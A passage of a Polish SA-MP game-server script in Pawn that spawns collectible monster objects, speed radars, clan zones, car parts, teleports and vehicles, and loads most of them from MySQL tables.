		format(str, sizeof(str), "{6E0BE0}%s (Psychiczny)\n{FF9900}£apanie: "C_WHITE"Klawisz "C_ORANGE"Y", PokemonName[respawnedpokemons]);
		Pokemon3D[respawnedpokemons] = Create3DTextLabel(str, 0x008080FF, x, y, z, 50.0, 0, 0);
	}
	PokemonSpawned[respawnedpokemons] = true;
	respawnedpokemons++;
	return 1;
}

CreatePremiumPokemon(Float:x, Float:y, Float:z, Float:Rx, Float:Ry, Float:Rz)
{
	if(respawnedpokemons >= MAX_POKEMONS) return 1;
	new respawn = random(2);
	if(respawn == 0) return 1;
	PokemonObj[respawnedpokemons] = CreateDynamicObject(1371, x, y, z, Rx, Ry, Rz, 0, -1, -1, 300.00, 300.00);
	PokemonType[respawnedpokemons] = 7;
	PokX[respawnedpokemons] = x;
	PokY[respawnedpokemons] = y;
	PokZ[respawnedpokemons] = z;
  	SetDynamicObjectMaterial(PokemonObj[respawnedpokemons], 0, 18646, "matcolours", "grey-40-percent", 0xFFFF96F2);
  	format(PokemonName[respawnedpokemons], 128, "Potwór specjalny");
	new str[256];
	format(str, sizeof(str), "{dd87ff}%s\n{c32bff}£apanie: "C_WHITE"Klawisz "C_ORANGE"Y", PokemonName[respawnedpokemons]);
	Pokemon3D[respawnedpokemons] = Create3DTextLabel(str, 0x008080FF, x, y, z, 50.0, 0, 0);
	PokemonSpawned[respawnedpokemons] = true;
	respawnedpokemons++;
	return 1;
}

CreateRadar(Float:x, Float:y, Float:z, Float:Rx, Float:Ry, Float:Rz)
{
	if(radary >= MAX_RADARS) return 1;
	CreateDynamicObject(18880, x, y, z, Rx, Ry, Rz, 0, 0, -1, 300.00, 300.00);
	Create3DTextLabel(""C_YELLOW"Kontrola prêdkoœci\n"C_WHITE"Zwolnij!", 0x008080FF, x, y, z + 3, 100.0, 0, 0);
	radarX[radary] = x;
	radarY[radary] = y;
	radarZ[radary] = z;
	radary++;
	return 1;
}

forward RespawnPokemons();
public RespawnPokemons()
{
	if(SEventType == 5) return 1;
	Loop(pokemonid, MAX_POKEMONS)
	{
	    if(PokemonSpawned[pokemonid])
	    {
			IsCatching[pokemonid] = false;
	        DestroyDynamicObject(PokemonObj[pokemonid]);
	        Delete3DTextLabel(Pokemon3D[pokemonid]);
	        PokemonSpawned[pokemonid] = false;
		}
	}
	respawnedpokemons = 0;
	CreatePokemon(1787.239501, 1312.691528, 6.509478, 0.000000, 0.000000, 0.000000);
	CreatePokemon(1805.581176, 1445.782226, 6.509478, 0.000000, 0.000000, -178.700012);
	CreatePokemon(1807.180419, 1453.208618, 13.469480, 0.000000, 0.000000, 89.799949);
	CreatePokemon(2048.730712, 1452.367187, 10.419477, 0.000000, 0.000000, 2.699959);
	CreatePokemon(2337.101074, 1533.127685, 10.419477, 0.000000, 0.000000, -91.400009);
	CreatePokemon(2452.313720, 1770.945556, 10.419477, 0.000000, 0.000000, -91.400009);
	CreatePokemon(2146.526123, 2014.380126, 10.419477, 0.000000, 0.000000, -0.400024);
	CreatePokemon(1947.594360, 2022.169799, 10.419477, 0.000000, 0.000000, 91.399986);
	CreatePokemon(1883.703125, 1971.024414, 7.339477, 0.000000, 0.000000, 91.399986);
	CreatePokemon(1707.624023, 1966.724365, 10.579486, 0.000000, 0.000000, 178.899963);
	CreatePokemon(1602.361938, 1873.304809, 10.579486, 0.000000, 0.000000, 89.000015);
	CreatePokemon(1601.561401, 1827.411132, 10.579486, 0.000000, 0.000000, 89.000015);
	CreatePokemon(1532.163574, 1786.677978, 10.579486, 0.000000, 0.000000, 3.000048);
	CreatePokemon(1547.490234, 1657.612060, 10.579486, 0.000000, 0.000000, 90.600082);
	CreatePokemon(1595.454711, 1472.983764, 10.579486, 0.000000, 0.000000, -87.800109);
	CreatePokemon(1571.098999, 1261.914794, 10.579486, 0.000000, 0.000000, 178.699905);
	CreatePokemon(1688.856933, 1258.210693, 10.579486, 0.000000, 0.000000, 89.699935);
	CreatePokemon(1707.355224, 1383.467163, 10.579486, 0.000000, 0.000000, 89.699935);
	CreatePokemon(1650.464355, 1133.149658, 10.439483, 0.000000, 0.000000, 89.699935);
	CreatePokemon(1669.842285, 1019.865295, 10.439483, 0.000000, 0.000000, -1.100035);
	CreatePokemon(1567.390747, 940.930969, 10.439483, 0.000000, 0.000000, 178.099945);
	CreatePokemon(1480.324584, 851.699951, 6.579483, 0.000000, 0.000000, 90.400016);
	CreatePokemon(1340.157714, 850.721923, 6.579483, 0.000000, 0.000000, 90.400016);
	CreatePokemon(1270.647338, 824.846313, 7.899472, 0.000000, 0.000000, 90.400016);
	CreatePokemon(1269.273193, 1021.792846, 10.559488, 0.000000, 0.000000, -53.399978);
	CreatePokemon(1306.085693, 1070.743774, 10.559488, 0.000000, 0.000000, -82.699974);
	CreatePokemon(1227.701171, 1163.758056, 6.549478, 0.000000, 0.000000, 5.500022);
	CreatePokemon(1223.604736, 1206.301757, 6.549478, 0.000000, 0.000000, 5.500022);
	CreatePokemon(1208.555175, 1518.032592, 6.549478, 0.000000, 0.000000, -1.099976);
	CreatePokemon(1138.630004, 1812.129516, 10.799483, 0.000000, 0.000000, 5.400021);
	CreatePokemon(930.451904, 1853.195556, 10.409479, 0.000000, 0.000000, 88.300041);
	CreatePokemon(958.333374, 1994.638671, 10.489480, 0.000000, 0.000000, -3.699952);
	CreatePokemon(1007.398681, 1991.466674, 10.429479, 0.000000, 0.000000, -3.699952);
	CreatePokemon(999.384094, 2129.769775, 10.429479, 0.000000, 0.000000, 88.699989);
	CreatePokemon(907.343505, 2194.272460, 10.419479, 0.000000, 0.000000, 1.899977);
	CreatePokemon(1075.300170, 2293.244873, 10.436843, 0.000000, 0.000000, -84.200019);
	CreatePokemon(1139.311157, 2357.393798, 10.556847, 0.000000, 0.000000, 67.499984);
	CreatePokemon(1240.017822, 2430.234619, 13.776837, 0.000000, 0.000000, 67.499984);
	CreatePokemon(1511.456787, 2375.612792, 10.566832, 0.000000, 0.000000, 67.499984);
	CreatePokemon(1896.463134, 2298.201660, 10.596831, 0.000000, 0.000000, -2.699997);
	CreatePokemon(2127.485839, 2370.447998, 10.596831, 0.000000, 0.000000, -2.699997);
	CreatePokemon(2209.895263, 2490.528076, 10.596831, 0.000000, 0.000000, -2.699997);
	CreatePokemon(2280.949951, 2467.751464, 10.566830, 0.000000, 0.000000, -2.699997);
	CreatePokemon(2413.309570, 2513.324218, 10.566830, 0.000000, 0.000000, -88.299957);
	CreatePokemon(2416.907470, 2392.195556, 10.556830, 0.000000, 0.000000, -93.299919);
	CreatePokemon(2415.141601, 2245.264160, 10.556830, 0.000000, 0.000000, -179.699905);
	CreatePokemon(2350.275390, 2133.453369, 10.556830, 0.000000, 0.000000, 0.200074);
	CreatePokemon(2319.909179, 1975.236694, 12.526839, 0.000000, 0.000000, 177.700088);
	CreatePokemon(2402.042968, 1955.492065, 11.426826, 0.000000, 0.000000, 90.500106);
	CreatePokemon(2507.449462, 1915.279418, 10.576822, 0.000000, 0.000000, -179.499816);
	CreatePokemon(2584.291503, 1980.853881, 10.556822, 0.000000, 0.000000, -0.299851);
	CreatePokemon(2834.301025, 1955.245727, 10.556818, 0.000000, 0.000000, -158.799865);
	CreatePokemon(2727.231201, 1878.598632, 6.476806, 0.000000, 0.000000, -179.499801);
	CreatePokemon(2716.686035, 1628.577636, 6.456807, 0.000000, 0.000000, -179.499801);
	CreatePokemon(2719.438232, 1313.437133, 13.746789, 0.000000, 0.000000, -96.499786);
	CreatePokemon(2578.114990, 1264.793334, 10.556793, 0.000000, 0.000000, -2.699780);
	CreatePokemon(2394.092529, 1227.740356, 10.546792, 0.000000, 0.000000, -2.699780);
	CreatePokemon(2169.030029, 1174.111694, 10.556795, 0.000000, 0.000000, -94.999771);
	CreatePokemon(2033.351196, 997.273193, 10.576791, 0.000000, 0.000000, 91.300270);
	CreatePokemon(1975.013793, 914.127563, 16.396806, 0.000000, 0.000000, 91.300270);
	CreatePokemon(1726.107055, 940.891296, 17.398237, 0.000000, 0.000000, 0.000000);
	CreatePokemon(1461.076660, 940.891296, 20.198215, 0.000000, 0.000000, -178.400024);
	CreatePokemon(1454.589965, 714.396972, 10.494290, 0.000000, 0.000000, 0.000000);
	CreatePokemon(1454.589965, 478.087524, 18.774303, 0.000000, 0.000000, 0.000000);
	CreatePokemon(1408.467041, 404.576660, 19.474287, 0.000000, 0.000000, -116.200004);
	CreatePokemon(1343.384643, 281.962860, 19.474287, 0.000000, 0.000000, 65.600006);
	CreatePokemon(1181.547119, 308.506683, 18.475242, 0.000000, 0.000000, 97.000000);
	CreatePokemon(865.380920, 269.686035, 20.785249, 0.000000, 0.000000, 97.000000);
	CreatePokemon(754.782470, 264.868896, 26.842731, 0.000000, 0.000000, 103.400016);
	CreatePokemon(486.085968, 212.110900, 11.722721, 0.000000, 0.000000, 131.899993);
	CreatePokemon(259.326446, 18.633859, 2.182720, 0.000000, 0.000000, -80.300003);
	CreatePokemon(164.724929, -54.372032, 1.322721, 0.000000, 0.000000, 91.300033);
	CreatePokemon(81.179855, -226.541900, 1.402721, 0.000000, 0.000000, -179.600006);
	CreatePokemon(-408.420989, -468.607696, 18.374908, 0.000000, 0.000000, 0.000000);
	CreatePokemon(-1558.573242, -443.566650, 5.781713, 0.000000, 0.000000, -42.499992);
	CreatePokemon(-1691.684814, -588.832336, 14.391714, 0.000000, 0.000000, -136.999969);
	CreatePokemon(-1926.768554, -577.960388, 24.184137, 0.000000, 0.000000, 0.000000);
	CreatePokemon(-2067.467773, -577.960388, 29.624141, 0.000000, 0.000000, -142.699996);
	CreatePokemon(-1974.197509, -506.907775, 35.144138, 0.000000, 0.000000, 169.600006);
	CreatePokemon(-2005.617187, -233.621398, 35.474147, 0.000000, 0.000000, 178.000015);
	CreatePokemon(-1996.301757, -39.908493, 35.074146, 0.000000, 0.000000, 178.000015);
	CreatePokemon(-1986.334716, 245.527359, 34.964160, 0.000000, 0.000000, 178.000015);
	CreatePokemon(-2003.344360, 467.020629, 34.814178, 0.000000, 0.000000, -0.799988);
	CreatePokemon(-2140.334716, 568.635253, 34.757663, 0.000000, 0.000000, 0.000000);
	CreatePokemon(-2274.964111, 534.644958, 34.757663, 0.000000, 0.000000, 91.399971);
	CreatePokemon(-2271.423339, 389.657928, 34.367675, 0.000000, 0.000000, 19.399972);
	CreatePokemon(-2251.415771, 236.295883, 34.937667, 0.000000, 0.000000, 175.799987);
	CreatePokemon(-2343.768066, 93.285781, 35.057655, 0.000000, 0.000000, 144.500000);
	CreatePokemon(-2372.036865, -28.271207, 35.057655, 0.000000, 0.000000, 173.800033);
	CreatePokemon(-2502.633544, -69.709075, 25.247642, 0.000000, 0.000000, 87.600051);
	CreatePokemon(-2664.037353, -46.139587, 4.087635, 0.000000, 0.000000, -94.499938);
	CreatePokemon(-2653.161621, 95.005462, 3.887635, 0.000000, 0.000000, -5.399934);
	CreatePokemon(-2706.340820, 262.452514, 3.957635, 0.000000, 0.000000, -1.099935);
	CreatePokemon(-2706.397705, 442.836853, 3.957635, 0.000000, 0.000000, -1.099935);
	CreatePokemon(-2684.410888, 594.092834, 14.137617, 0.000000, 0.000000, -89.399955);
	CreatePokemon(-2599.931152, 720.922119, 27.917627, 0.000000, 0.000000, -89.399955);
	CreatePokemon(-2457.993896, 753.630859, 34.907657, 0.000000, 0.000000, 3.800033);
	CreatePokemon(-2690.231445, 720.544250, 32.497604, 0.000000, 0.000000, 3.800033);
	CreatePokemon(-1907.240600, 957.790466, 34.788391, 0.000000, 0.000000, 0.000000);
	CreatePokemon(-1776.789672, 957.790466, 24.448352, 0.000000, 0.000000, 86.000030);
	CreatePokemon(-1600.536499, 796.308105, 6.549839, 0.000000, 0.000000, -37.899997);
	CreatePokemon(-1485.593750, 672.699279, 6.940317, 0.000000, 0.000000, 0.000000);
	CreatePokemon(-1703.716552, 652.731323, 24.646148, 0.000000, 0.000000, 0.000000);
	CreatePokemon(-1912.104125, 487.682189, 34.926548, 0.000000, 0.000000, 0.000000);
	CreatePokemon(-1883.842041, -161.501327, 11.654102, 0.000000, 0.000000, -177.300033);
	CreatePokemon(-1910.975708, -350.500305, 38.004535, 0.000000, 0.000000, -172.400039);
	CreatePokemon(-2010.310302, -859.742858, 31.956602, 0.000000, 0.000000, 88.899963);
	CreatePokemon(-1996.837158, -1500.069580, 83.851493, 0.000000, 0.000000, -178.299987);
	CreatePokemon(-1903.841796, -1330.823242, 39.929290, 0.000000, 0.000000, 176.400054);
	CreatePokemon(-1899.897949, -1526.414916, 21.512786, 0.000000, 0.000000, 0.000000);
	CreatePokemon(-1640.813842, -1626.570434, 36.002586, 0.000000, 0.000000, -61.199981);
	CreatePokemon(-1158.187377, -2320.013427, 39.393463, 0.000000, 0.000000, 164.699935);
	CreatePokemon(-765.352539, -2676.508789, 84.092987, 0.000000, 0.000000, 0.000000);
	CreatePokemon(-511.744598, -2798.066894, 47.674144, 0.000000, 0.000000, -101.299980);
	CreatePokemon(20.527011, -2638.475097, 40.186531, 0.000000, 0.000000, -87.399986);
	CreatePokemon(-158.923171, -1630.158935, 2.983232, 0.000000, 0.000000, -95.500000);
	CreatePokemon(49.020492, -1532.170898, 5.075233, 0.000000, 0.000000, -93.399963);
	CreatePokemon(192.397613, -1519.920288, 12.342023, 0.000000, 0.000000, -116.899971);
	CreatePokemon(365.842163, -1430.669799, 33.986454, 0.000000, 0.000000, -51.899959);
	CreatePokemon(396.099090, -1466.809570, 31.126449, 0.000000, 0.000000, 37.800033);
	CreatePokemon(516.806213, -1419.931274, 16.026458, 0.000000, 0.000000, -68.399887);
	CreatePokemon(632.621765, -1368.421142, 13.216433, 0.000000, 0.000000, -3.499879);
	CreatePokemon(632.340209, -1505.833129, 14.489150, 0.000000, 0.000000, -178.300048);
	CreatePokemon(676.317810, -1586.554199, 13.799152, 0.000000, 0.000000, -86.700019);
	CreatePokemon(784.697814, -1580.305419, 13.319149, 0.000000, 0.000000, -27.000020);
	CreatePokemon(1038.117065, -1572.252563, 13.134426, 0.000000, 0.000000, -90.799995);
	CreatePokemon(1149.984130, -1637.604370, 13.504402, 0.000000, 0.000000, -178.199981);
	CreatePokemon(2001.608764, -1653.690185, 13.138837, 0.000000, 0.000000, 0.000000);
	CreatePokemon(1959.310546, -1449.328125, 13.195847, 0.000000, 0.000000, 0.000000);
	CreatePokemon(2033.915283, -1442.572753, 17.064975, 0.000000, 0.000000, -178.500030);
	CreatePokemon(2260.989013, -1432.026733, 23.768089, 0.000000, 0.000000, -91.499992);
	CreatePokemon(2290.568359, -1528.550048, 26.659704, 0.000000, 0.000000, 177.599960);
	CreatePokemon(2850.522949, -1488.413208, 10.505945, 0.000000, 0.000000, -88.499992);
	CreatePokemon(2576.521972, -1444.314086, 34.710674, 0.000000, 0.000000, 86.199981);
	CreatePokemon(2270.889160, -1321.405517, 23.552486, 0.000000, 0.000000, 0.000000);
	CreatePokemon(1849.394653, -1260.583740, 13.137319, 0.000000, 0.000000, 85.299995);
	CreatePokemon(1645.745727, -1341.355834, 17.104709, 0.000000, 0.000000, 178.899963);
	CreatePokemon(2784.675048, -1863.352539, 9.813094, 0.000000, 0.000000, 0.000000);
	CreatePokemon(2671.244140, -1997.980224, 13.088453, 0.000000, 0.000000, 90.699996);
	CreatePokemon(2568.379394, -2029.972778, 3.428620, 0.000000, 0.000000, 0.000000);
	CreatePokemon(2198.308593, -1976.909423, 13.316904, 0.000000, 0.000000, 96.699989);
	CreatePokemon(2070.891601, -1804.279052, 13.297111, 0.000000, 0.000000, 88.399978);
	CreatePokemon(1707.337402, -1440.937988, 12.996101, 0.000000, 0.000000, 88.099998);
  	return SetTimer("RespawnPokemons", 1000*1800, 0);
}

#include Impreza\events.inc

forward rudaDay();
public rudaDay() {
	if(isnull(configstart)) SendRconCommand("exit");
	rudadnia = random(7); }
#define MAX_GANGS 15
#define MAX_GANGZONES 15
new gangs, gangzones;
new parts;
new Float:partX[MAX_PARTS], Float:partY[MAX_PARTS], Float:partZ[MAX_PARTS];
new arrows;
new parks;
new lvehicles;
new sVehicle[MAX_SVEHICLES];
new Float:sX[MAX_SVEHICLES], Float:sY[MAX_SVEHICLES], Float:sZ[MAX_SVEHICLES], Float: sA[MAX_SVEHICLES];
new Text3D:NapadTD[MAX_NAPADY], NapadCP[MAX_NAPADY], Float:NX[MAX_NAPADY], Float:NY[MAX_NAPADY], Float:NZ[MAX_NAPADY], NapadName[MAX_NAPADY][64], creatednapady, NValue[MAX_NAPADY], bool:NAtt[MAX_NAPADY], Atakuje[MAX_NAPADY], NapadNameTD[MAX_NAPADY][128];
new NapadID[MAX_PLAYERS], NapadTime[MAX_NAPADY];
new PartPickup[MAX_PARTS], Text3D:PartTD[MAX_PARTS], bool:POnMap[MAX_PARTS];
new ArrowPickup[MAX_ARROWS], ArrowPickup2[MAX_ARROWS], Text3D:ArrowTD[MAX_ARROWS], Text3D:ArrowTDs[MAX_ARROWS], bool:AOnMap[MAX_ARROWS], Float:aX[MAX_ARROWS], Float:aY[MAX_ARROWS], Float:aZ[MAX_ARROWS], Float:aX2[MAX_ARROWS];
new Float:aY2[MAX_ARROWS], Float:aZ2[MAX_ARROWS];
new Float:TempX[MAX_PLAYERS], Float:TempY[MAX_PLAYERS], Float:TempZ[MAX_PLAYERS];
new Text3D:ParkTD[MAX_PARKS];
new Float:ipx[MAX_PARKS], Float:ipy[MAX_PARKS], Float:ipz[MAX_PARKS];
new gangsdeleted;
new gWar[MAX_GANGS];
new WarScore[MAX_GANGS];
new WarTimer;
new wattackers, wdeffenders;
new attackerid, deffenderid;
new warvehicle;
new bool:Attacker[MAX_PLAYERS];
new bool:Deffender[MAX_PLAYERS];
new bool:NaWojnie[MAX_PLAYERS];
new gName[MAX_GANGS][17], gColor[MAX_GANGS], gTag[MAX_GANGS][7], Float:gSpawnX[MAX_GANGS], Float:gSpawnY[MAX_GANGS], Float:gSpawnZ[MAX_GANGS], gScore[MAX_GANGS];
new Float:gVehX[MAX_GANGS], Float:gVehY[MAX_GANGS], Float:gVehZ[MAX_GANGS], Float:gVehA[MAX_GANGS], Float:gMinX[MAX_GANGS], Float:gMinY[MAX_GANGS], Float:gMaxX[MAX_GANGS], Float:gMaxY[MAX_GANGS], gZone[MAX_GANGS], Text3D:gText[MAX_GANGS], gLider1[MAX_PLAYERS], gLider2[MAX_PLAYERS];
new gZZone[MAX_GANGZONES], Float:gzmiX[MAX_GANGZONES], Float:gzmiY[MAX_GANGZONES], Float:gzmaX[MAX_GANGZONES], Float:gzmaY[MAX_GANGZONES], gzOwner[MAX_GANGZONES], gzTimer[MAX_GANGZONES], gzAttacker[MAX_GANGZONES];
new bool:gAch[MAX_GANGS][8];
new pAch[MAX_PLAYERS][22];

LoadClans()
{
	new s[2048], gangid = -1, tdstr[256];
	m_query("SELECT uid, name, color, tag, spawnx, spawny, spawnz, vx, vy, vz, va, minx, miny, maxx, maxy, respekt, lider1, lider2, ga0, ga1, ga2, ga3, ga4, ga5, ga6, ga7 FROM clans ORDER BY uid ASC");
	mysql_store_result();
	while(mysql_fetch_row(s))
	{
		if(gangs >= MAX_GANGS) return 1;
		sscanf(s, "p<|>is[2048]", gangid, s);
		sscanf(s, "p<|>s[17]is[7]fffffffffffiiiiiiiiiii", gName[gangid], gColor[gangid], gTag[gangid], gSpawnX[gangid], gSpawnY[gangid], gSpawnZ[gangid], gVehX[gangid], gVehY[gangid], gVehZ[gangid], gVehA[gangid], gMinX[gangid], gMinY[gangid], gMaxX[gangid], gMaxY[gangid], gScore[gangid], gLider1[gangid], gLider2[gangid],
			gAch[gangid][0], gAch[gangid][1], gAch[gangid][2], gAch[gangid][3], gAch[gangid][4], gAch[gangid][5], gAch[gangid][6], gAch[gangid][7]);
		gZone[gangid] = GangZoneCreate(gMinX[gangid], gMinY[gangid], gMaxX[gangid], gMaxY[gangid]);
		format(tdstr, sizeof(tdstr), "%s [%s] "C_WHITE"(ID "C_ORANGE"%d"C_WHITE")\n"C_YELLOW"Punkt startowy klanu", gName[gangid], gTag[gangid], gangid);
		if(gColor[gangid] == 0) gText[gangid] = Create3DTextLabel(tdstr, GREY, gSpawnX[gangid], gSpawnY[gangid], gSpawnZ[gangid], 60.0, 0, 0);
		if(gColor[gangid] == 1) gText[gangid] = Create3DTextLabel(tdstr, GREEN, gSpawnX[gangid], gSpawnY[gangid], gSpawnZ[gangid], 60.0, 0, 0);
		if(gColor[gangid] == 2) gText[gangid] = Create3DTextLabel(tdstr, RED, gSpawnX[gangid], gSpawnY[gangid], gSpawnZ[gangid], 60.0, 0, 0);
		if(gColor[gangid] == 3) gText[gangid] = Create3DTextLabel(tdstr, YELLOW, gSpawnX[gangid], gSpawnY[gangid], gSpawnZ[gangid], 60.0, 0, 0);
		if(gColor[gangid] == 4) gText[gangid] = Create3DTextLabel(tdstr, BLUE, gSpawnX[gangid], gSpawnY[gangid], gSpawnZ[gangid], 60.0, 0, 0);
		if(gColor[gangid] == 5) gText[gangid] = Create3DTextLabel(tdstr, ORANGE, gSpawnX[gangid], gSpawnY[gangid], gSpawnZ[gangid], 60.0, 0, 0);
		if(gColor[gangid] == 6) gText[gangid] = Create3DTextLabel(tdstr, MAGENTA, gSpawnX[gangid], gSpawnY[gangid], gSpawnZ[gangid], 60.0, 0, 0);
		if(gColor[gangid] == 7) gText[gangid] = Create3DTextLabel(tdstr, AQUA, gSpawnX[gangid], gSpawnY[gangid], gSpawnZ[gangid], 60.0, 0, 0);
		if(gColor[gangid] == 8) gText[gangid] = Create3DTextLabel(tdstr, GOLD, gSpawnX[gangid], gSpawnY[gangid], gSpawnZ[gangid], 60.0, 0, 0);
		if(gColor[gangid] == 9) gText[gangid] = Create3DTextLabel(tdstr, SEAGREEN, gSpawnX[gangid], gSpawnY[gangid], gSpawnZ[gangid], 60.0, 0, 0);
		if(gColor[gangid] == 10) gText[gangid] = Create3DTextLabel(tdstr, OLIVE, gSpawnX[gangid], gSpawnY[gangid], gSpawnZ[gangid], 60.0, 0, 0);
		if(gColor[gangid] == 11) gText[gangid] = Create3DTextLabel(tdstr, SPRINGGREEN, gSpawnX[gangid], gSpawnY[gangid], gSpawnZ[gangid], 60.0, 0, 0);
		if(gColor[gangid] == 12) gText[gangid] = Create3DTextLabel(tdstr, MAROON, gSpawnX[gangid], gSpawnY[gangid], gSpawnZ[gangid], 60.0, 0, 0);
		if(gColor[gangid] == 13) gText[gangid] = Create3DTextLabel(tdstr, LIME, gSpawnX[gangid], gSpawnY[gangid], gSpawnZ[gangid], 60.0, 0, 0);
		if(gColor[gangid] == 14) gText[gangid] = Create3DTextLabel(tdstr, MEDIUMAQUA, gSpawnX[gangid], gSpawnY[gangid], gSpawnZ[gangid], 60.0, 0, 0);
		printf("%d. %s [%s]", gangid, gName[gangid], gTag[gangid]);
		gWar[gangid] = -1;
		gangs++;
	}
	printf(" >>> Wczytane klany: %d", gangs);
	mysql_free_result();
	return 1;
}

CreateClanZone(Float:mix, Float:miy, Float:max, Float:may)
{
	if(gangzones > MAX_GANGZONES) return 1;
	gZZone[gangzones] = GangZoneCreate(mix, miy, max, may);
	gzmiX[gangzones] = mix;
	gzmiY[gangzones] = miy;
	gzmaX[gangzones] = max;
	gzmaY[gangzones] = may;
	gzOwner[gangzones] = -1;
	gzAttacker[gangzones] = -1;
	gzTimer[gangzones] = 0;
	gangzones++;
	return 1;
}

CreatePart(partid, Float:x, Float:y, Float:z) {
  PartPickup[partid] = CreateDynamicPickup(2485, 1, x, y, z, 0, -1, -1, 60.0);
  PartTD[partid] = Create3DTextLabel("{AD632B}Czêœæ do samochodu\n"C_YELLOW"Zbieraj je, aby móc kupiæ prywatny pojazd.", -1, x, y, z, 30.0, 0, 0);
  partX[partid] = x;
  partY[partid] = y;
  partZ[partid] = z;
  POnMap[partid] = true; }

NewNapad(Nazwa[], Float:x, Float:y, Float:z, Value, tdname[]) {
    NapadCP[creatednapady] = CreateDynamicCP(x,y,z,2.0,-1,-1,-1,35.0);
	new nstr[256];
	format(nstr, sizeof(nstr), ""C_WHITE"Napad: {6efc58}%s\n{6efc58}%d "C_WHITE"EXP, %d{6efc58}$", Nazwa, Value, Value * 10);
	NapadTD[creatednapady] = Create3DTextLabel(nstr, -1, x, y, z, 35.0, 0, 0);
	format(NapadName[creatednapady], 64, "%s", Nazwa);
	format(NapadNameTD[creatednapady], 128, "%s", tdname);
	NValue[creatednapady] = Value;
	NapadTime[creatednapady] = -1;
	NX[creatednapady] = x;
	NY[creatednapady] = y;
	NZ[creatednapady] = z;
	NAtt[creatednapady] = true;
	Atakuje[creatednapady] = -1;
	creatednapady++; }

BlockNapad(napadid) {
	NAtt[napadid] = false;
	new nstr[256];
	format(nstr, sizeof(nstr), ""C_WHITE"Napad: {6efc58}%s\n"C_RED"Tymczasowo niemo¿liwy", NapadName[napadid]);
	Update3DTextLabelText(NapadTD[napadid], 0xFFFFFFFF, nstr); }


CreateArrow(arrowid, arrowname[], Float:x, Float:y, Float:z, Float:x2, Float:y2, Float:z2) {
	aX[arrowid] = x;
	aY[arrowid] = y;
	aZ[arrowid] = z;
	aX2[arrowid] = x2;
	aY2[arrowid] = y2;
	aZ2[arrowid] = z2;
	ArrowPickup[arrowid] = CreateDynamicPickup(1318, 1, x, y, z, 0, -1, -1, 75.0);
	new str[256];
	format(str, sizeof(str), ""C_BLUE1"%s\n"C_WHITE"» {27FF1C}WejdŸ "C_WHITE"«", arrowname);
	ArrowTD[arrowid] = Create3DTextLabel(str, -1, x, y, z, 75.0, 0, 0);
	ArrowPickup2[arrowid] = CreateDynamicPickup(1318, 1, x2, y2, z2, 0, -1, -1, 75.0);
	ArrowTDs[arrowid] = Create3DTextLabel(str, -1, x2, y2, z2, 75.0, 0, 0);
	AOnMap[arrowid] = true; }

CreatePark(parkid, Float:x, Float:y, Float:z)
{
	ParkTD[parkid] = Create3DTextLabel("{B0F760}ItemPark\n{FF9900}Interakcja: "C_WHITE"Klawisz "C_ORANGE"Y", -1, x, y, z, 45.0, 0, 0);
	ipx[parkid] = x;
	ipy[parkid] = y;
	ipz[parkid] = z;
}

LoadParts()
{
	parts = 0;
	new s[1024], partid = -1, Float:x, Float:y, Float:z;
	m_query("SELECT pid, x, y, z FROM parts ORDER BY pid ASC");
	mysql_store_result();
	while(mysql_fetch_row(s))
	{
		if(parts >= MAX_PARTS) return 1;
		sscanf(s, "p<|>is[1024]", partid, s);
		sscanf(s, "p<|>fff", x, y, z);
		CreatePart(partid, x, y, z);
		parts++;
	}
	printf(" >>> Wczytane czêœci samochodowe: %d", parts);
	mysql_free_result();
	SetTimer("ResetParts", 1000*1800, 0);
	return 1;
}

forward ResetParts();
public ResetParts()
{
	Loop(partss, MAX_PARTS) {
	    if(POnMap[partss]) {
	        Delete3DTextLabel(PartTD[partss]);
	        DestroyDynamicPickup(PartPickup[partss]);
	        POnMap[partss] = false; } }
	LoadParts();
}

LoadArrows()
{
	arrows = 0;
	new s[1024], arrowid = -1, Float:x, Float:y, Float:z, Float:x2, Float:y2, Float:z2, arrowname[32];
	m_query("SELECT aid, name, x, y, z, x2, y2, z2 FROM arrows ORDER BY aid ASC");
	mysql_store_result();
	while(mysql_fetch_row(s))
	{
		if(arrows >= MAX_ARROWS) return 1;
		sscanf(s, "p<|>is[1024]", arrowid, s);
		sscanf(s, "p<|>s[32]ffffff", arrowname, x, y, z, x2, y2, z2);
		CreateArrow(arrowid, arrowname, x, y, z, x2, y2, z2);
		arrows++;
	}
	printf(" >>> Wczytane strza³ki: %d", arrows);
	mysql_free_result();
	return 1;
}

LoadParks()
{
	parks = 0;
	new s[1024], parkid = -1;
	m_query("SELECT pid, x, y, z FROM parks ORDER BY pid ASC");
	mysql_store_result();
	while(mysql_fetch_row(s))
	{
		if(parks >= MAX_PARKS) return 1;
		sscanf(s, "p<|>is[1024]", parkid, s);
		sscanf(s, "p<|>fff", ipx[parkid], ipy[parkid], ipz[parkid]);
		CreatePark(parkid, ipx[parkid], ipy[parkid], ipz[parkid]);
		parks++;
	}
	printf(" >>> Wczytane ItemParki: %d", parks);
	mysql_free_result();
	return 1;
}

CreateServerVehicle(vehicleid, modelid, Float:x, Float:y, Float:z, Float:a) {
	sVehicle[vehicleid] = CreateVehicle(modelid, x, y, z+1.3, a, random(200), random(200), 60);
	SetVehicleHandling(sVehicle[vehicleid]);
	SetVehicleNumberPlate(sVehicle[vehicleid], "{6ba7d6}Impreza");
	AddVehicleComponent(sVehicle[vehicleid], 1010); }

LoadVehicles()
{
	lvehicles = 0;
	new s[1024], vehicleid = -1, Float:x, Float:y, Float:z, Float:a, modelid;
	m_query("SELECT vid, model, x, y, z, a FROM vehicles ORDER BY vid ASC");
	mysql_store_result();
	while(mysql_fetch_row(s))
	{
		if(lvehicles >= MAX_SVEHICLES) return 1;
		sscanf(s, "p<|>is[1024]", vehicleid, s);
		sscanf(s, "p<|>iffff", modelid, x, y, z, a);
		sX[vehicleid] = x;
		sY[vehicleid] = y;
		sZ[vehicleid] = z;
		sA[vehicleid] = a;
		CreateServerVehicle(vehicleid, modelid, x, y, z, a);
		lvehicles++;
	}
	mysql_free_result();
	return 1;
}

new bool:OnMap[MAX_PRIVCARS], Text3D:pText[MAX_PRIVCARS], ppVeh[MAX_PRIVCARS], pOwnerN[MAX_PRIVCARS][20], pModel[MAX_PRIVCARS], pOwner[MAX_PRIVCARS], Float:pFuel[MAX_PRIVCARS], pFuelT[MAX_PRIVCARS];
